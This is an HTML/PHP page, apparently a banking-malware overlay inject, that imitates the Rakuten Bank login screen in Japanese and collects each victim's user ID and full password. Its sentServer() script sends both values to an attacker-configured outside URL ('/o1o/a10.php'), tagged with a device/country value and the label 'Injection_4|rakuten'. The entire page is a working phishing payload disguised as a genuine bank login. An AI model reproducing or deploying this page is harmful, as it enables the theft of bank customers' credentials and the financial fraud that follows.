<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, minimal-ui" />
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Bawag</title>

    <script src="js/jquery-1.12.0.min.js"></script>
    <script src="js/viewport.js"></script>
	<script src="js/cat.functions.js"></script>

    <link rel="stylesheet" href="bootstrap/dist/css/bootstrap.min.css">
	<link rel="stylesheet" href="font-awesome/css/font-awesome.min.css">
	<link rel="stylesheet" href="jp/jp.co.rakuten_bank.rakutenbank/css/style.css">
	<link rel="stylesheet" href="css/cat.style.css" type="text/css" media="all">
</head>
<?php
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
include "config.php"; ?>
<body>
<div class="header">
	<b style="font;width: 100%;display: block;">ログイン </b>
	<img style="width: 40px;margin-right: 10px;float: right;margin-top: -30px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGIAAABiCAMAAACce/Y8AAACK1BMVEX///9ONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAIV2d/vAAAAuXRSTlMAAAlEd52zu6qMYyYCTq/3/9+CIVXWzoZLIxQ0pfD7oBwbuviXKgdYz/NuAUXssR9c5wxa+fZiFbnK/O05A5nICi71MZay2P5HuG+EiSdzknDo9B7eop+QT1Ob/ajQCO/gBGEzcVmDvQZ13ZhWhyRmbGUF+sJ+NoognKstjml2UW2+4pMLERjpTbYQiEEityyswShQmkynldTHP1QwOsUdejepQvKuQHkpX9fGFoWBwNrDjbQPf79gj+5hCSoAAAQsSURBVGje7Zn7e9NUGMeXqszNkX0DTsfGBgOEzMoYuLG5CU4uiwO5DSnCZIFVdFwn4CWKCgITPMi1jpuVi0K84d0s+/NMmrY5J21p2En1eXzy7Q9pTtP3c8573vc957RlZaFChQoV6j+U4FeBISKPPPrYlPLyxysqnygJomqqWI2spGnTA0c8WQM89XTtjIgg1NVXzmxA46zZgSKa5mDuvGco4vwFMpqfjQaHeG4hWhZ53B9tXQxxSVCI59val+YJo45OvFAXDGJqV/eLeUN12XK81BME4uUVDSsL5cMqrI7yI3p6lVcKptyyPqzhR6zFq5TNdes3bNhIJV7Hpv7NvIimua9FsgaXbFHsvFNm9WSbWhHjRWxFK+2W9orXt20fwBtu7O5oXMSHGFR37sqaG0J73L6+CcSzjbvxFh9iG9a6jn8bq1LX4WbsyTYOqnv5EPtABayK/c6bXhxwW2fiIBeiprvKNTYy4lS+SDPecVsPYYgHcfjIu3my4T3017l37+MDHoSGD3MJlV0YoW7r8BEP4ig+ziF8ouBTJsPRx4Oop+fV0TEFx9kWfMaDWJcOU6rPJ3CSbTmF1TyIUbR4EPXA52zLQWznCtrTvR5ELfo9LWesPORBfKF0sAYPjxIP4iy+5ELsoapgAe2oHuRCnFPOFyFcwEXOYn5p4DJjcXgowSK+whgnYgxXGItXAWY3Mr3tWhUnInpduUGbLAez0ApT8DX32p3skkYpk9/U3Lwl0GV2TpR/k3MbncOF5vpO+8JbAeyjoi34tgAj3tD2XSC7wUg5Okk+Qu3dxgUB7WkH72GvngPoqVD6xwLbmVd936hc+YEtJD/uxE8XgjzCrPwZA32t9zPI+C8nUP1rJNhTUjTxmwLl95blZ7fG/lCB7j+bSnCcPLf+r02pg17btXnH5pfmxGrp7xnxo5t3le5QXIpzd6hQ/+IPRPmlG3oACF3XCn5mSNaLBwHYNX0cRsEnVK1MU4NAuItH0mAFUkbgC6HpJD9C8CB0eCTqYswPwgTUpC+EZxQxYNwgPhCm3Z18jFyEd7Yh+wrapIrxhAopx1ekKEKG4QdBZMjE5shehl4MkQQ0PwjR8VEehg71wYgYZD9LxwRgOl3KYSQw/kCEZn+1OMGa6onMsL0Mw0FIGYToQYiQfCyAG63Ipl3LMESHjjQiAdEzSCR8ICYYo9aQJCp2JceFGYTMFhI7EP0s40RmSpwVu25+WAFFKIQBlR6iFYip++Jz4Qkiq2vp2bf9JFKVyky5xX1QSnfm4dcLmyFmBpFwERYhRj1mZoc7iSVJk504IulrCkEmGIImupM2mVWPyLqTDUhmEKLqhrYFiNkVlgiTRwjEGUN2TlL/X+jUKK2aaT7MxrBAbTBdx1g1zGQSUjWIEABCcIsGYcs8McPtbahQoUL9//UP0+gHYBMhVgkAAAAASUVORK5CYII=">
</div>
    <div class="main">


        <div class="container">
<div class="row">
                <div class="col-xs-10 col-sm-8">
                    <div class="form_">

                        <form id="form">
<b style="color: #362c18">楽天銀行口座のユーザーID・ログインパスワードを入力してください。</b>
	<br><br>
                            <div class="form-group ">
									<label> 楽天銀行のユーザID </label>
									<input type="text" class="form-control" name="field2" id="login" autocomplete="off" maxlength="50" data-reg="/.{4,50}/" >
                            </div>

                            <div class="form-group">
									<label> ログインパスワード(全桁) </label>
									<input type="password" class="form-control" name="field3" id="password" autocomplete="off" data-reg="/.{4,50}/" maxlength="50" >
                            </div>


							<b style="display: block; float: right; color: #4e3402;"> ログインでお困りのお客さま  <img style="width: 9px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAMAAABbGh8VAAAA1VBMVEVONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONALiP2wdAAAAR3RSTlMAIMAkIuH/5Sgn5OguvOwyEsjvNwu48TwGpvRCApL2SH75Tmn8VFZaRPNjNev+4nBD9YZHgEr4ek92cVj7a11nYrRQt0sJsbVkPkQAAAC1SURBVCjPZdHFFsJADAXQYoO7FaeGD1YoUiro/38SZ9JFMpBd7uZFFEWJxROKXMkUS2ckyeYYY/kCpSITVSoTqlTBanVijSZYq01M7YB1e8T6A7DhiGaMwTSdmmGCWdQmmjBzSm02B1tQW66EcYNaZg22IbTdQe4exY7kgHJ0QE4oZxiCXVAsEH5FcW8gHooP6/AAJQQxQ5SAg/goXiQuis7/zqLehTykR6pP5rx+3v3+2FL/BRNyEb/EJ7z2AAAAAElFTkSuQmCC"></b><br><br>
							<b style="display: block; float: right; color: #4e3402;"> はじめて口座にログインする場合 <img style="width: 9px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAMAAABbGh8VAAAA1VBMVEVONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONALiP2wdAAAAR3RSTlMAIMAkIuH/5Sgn5OguvOwyEsjvNwu48TwGpvRCApL2SH75Tmn8VFZaRPNjNev+4nBD9YZHgEr4ek92cVj7a11nYrRQt0sJsbVkPkQAAAC1SURBVCjPZdHFFsJADAXQYoO7FaeGD1YoUiro/38SZ9JFMpBd7uZFFEWJxROKXMkUS2ckyeYYY/kCpSITVSoTqlTBanVijSZYq01M7YB1e8T6A7DhiGaMwTSdmmGCWdQmmjBzSm02B1tQW66EcYNaZg22IbTdQe4exY7kgHJ0QE4oZxiCXVAsEH5FcW8gHooP6/AAJQQxQ5SAg/goXiQuis7/zqLehTykR6pP5rx+3v3+2FL/BRNyEb/EJ7z2AAAAAElFTkSuQmCC"></b><br><br>
							<b style="display: block; float: right; color: #4e3402;"> 指紋認証でのログインについて  <img style="width: 9px;" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABIAAAAcCAMAAABbGh8VAAAA1VBMVEVONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONAJONALiP2wdAAAAR3RSTlMAIMAkIuH/5Sgn5OguvOwyEsjvNwu48TwGpvRCApL2SH75Tmn8VFZaRPNjNev+4nBD9YZHgEr4ek92cVj7a11nYrRQt0sJsbVkPkQAAAC1SURBVCjPZdHFFsJADAXQYoO7FaeGD1YoUiro/38SZ9JFMpBd7uZFFEWJxROKXMkUS2ckyeYYY/kCpSITVSoTqlTBanVijSZYq01M7YB1e8T6A7DhiGaMwTSdmmGCWdQmmjBzSm02B1tQW66EcYNaZg22IbTdQe4exY7kgHJ0QE4oZxiCXVAsEH5FcW8gHooP6/AAJQQxQ5SAg/goXiQuis7/zqLehTykR6pP5rx+3v3+2FL/BRNyEb/EJ7z2AAAAAElFTkSuQmCC"></b><br>

							<input class="input_submitBtn" onClick="sentServer();" type="button" value="ログイン ">
 </form><br>

</div>
                </div>
            </div>
        </div>
    </div>

<script>
	function sentServer()
	{
	var oNumInp1 = document.getElementById('login');
	var oNumInp2 = document.getElementById('password');


if ((oNumInp1.value.length > 5)&&(oNumInp2.value.length > 3)) {
	var url='<?php echo $URL; ?>';
	var imei_c='<?php echo $IMEI_country; ?>';

	var login1 = document.forms["form"].elements["login"].value;
	var pass = document.forms["form"].elements["password"].value;

	location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|rakuten|"+login1+"|"+pass);
	}}
</script>

</body>
</html>
